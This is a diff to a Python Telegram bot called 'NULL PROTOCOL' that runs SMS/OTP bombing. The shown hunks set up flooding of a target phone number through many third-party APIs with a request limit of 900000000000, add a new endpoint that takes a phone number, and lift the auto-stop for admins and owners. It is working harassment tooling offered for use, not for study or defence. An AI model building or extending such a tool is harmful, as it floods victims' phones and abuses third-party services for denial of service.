@@ -44,15 +44,14 @@ BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"
 # ------------------------------------------------------------------
 # Bombing configuration
 # ------------------------------------------------------------------
-API_INDICES = list(range(31))
+API_INDICES = list(range(32))                     # 32 APIs (0..31)
 DEFAULT_COUNTRY_CODE = "91"
 BOMBING_INTERVAL_SECONDS = 8
 MIN_INTERVAL = 1
 MAX_INTERVAL = 60
 MAX_REQUEST_LIMIT = 900000000000
 TELEGRAM_RATE_LIMIT_SECONDS = 5
-# Auto‑stop for normal users (10 minutes), admin/owner: no auto‑stop (set to None)
-NORMAL_USER_AUTO_STOP_SECONDS = 10 * 60   # 10 minutes
+NORMAL_USER_AUTO_STOP_SECONDS = 10 * 60           # 10 minutes
 
 bombing_active = {}          # user_id -> threading.Event
 bombing_threads = {}         # user_id -> list of threads
@@ -68,9 +67,9 @@ BASE_HEADERS = {
 }
 
 # ------------------------------------------------------------------
-# Log Channel & Force Channels Configuration
+# Log Channel & Force Channels
 # ------------------------------------------------------------------
-LOG_CHANNEL_ID = -1003712674883   # Your private log channel ID
+LOG_CHANNEL_ID = -1003712674883
 
 FORCE_CHANNELS = [
     {"name": "All Data Here", "link": "https://t.me/all_data_here", "id": -1003090922367},
@@ -95,7 +94,7 @@ STATE_AWAITING_ADMIN_REMOVEADMIN = 10
 STATE_AWAITING_ADMIN_LOOKUP = 11
 
 # ------------------------------------------------------------------
-# API functions (unchanged from original)
+# API functions (original 31 + new index 31)
 # ------------------------------------------------------------------
 def getapi(pn, lim, cc):
     cc = str(cc)
@@ -558,6 +557,15 @@ def getapi(pn, lim, cc):
             response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
             return response.status_code == 200 or 'success' in response.text.lower()
 
+        # 31: New Custom API (bomm.gauravcyber0.workers.dev)
+        elif lim == 31:
+            try:
+                url = f"https://bomm.gauravcyber0.workers.dev/?phone={pn}"
+                response = session.get(url, timeout=5)
+                return response.status_code == 200
+            except Exception:
+                return False
+
         return False
 
     except requests.exceptions.RequestException:
@@ -910,7 +918,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
         return
 
-    # Admin actions (list users, recent, etc.) – these are paginated, we can reuse existing logic
+    # Admin actions (list users, recent, etc.) – paginated
     elif data.startswith("admin_list_users") or data.startswith("list_users_page"):
         page = 0
         if data.startswith("list_users_page:"):
@@ -967,7 +975,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("Backup generated and sent above.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
 
     elif data == "admin_fullbackup" and is_owner(user_id):
-        # Same as backup but for owner
         users = get_all_users_paginated(0, 999999)
         data_json = [dict(u) for u in users]
         backup_json = json.dumps(data_json, default=str, indent=2)
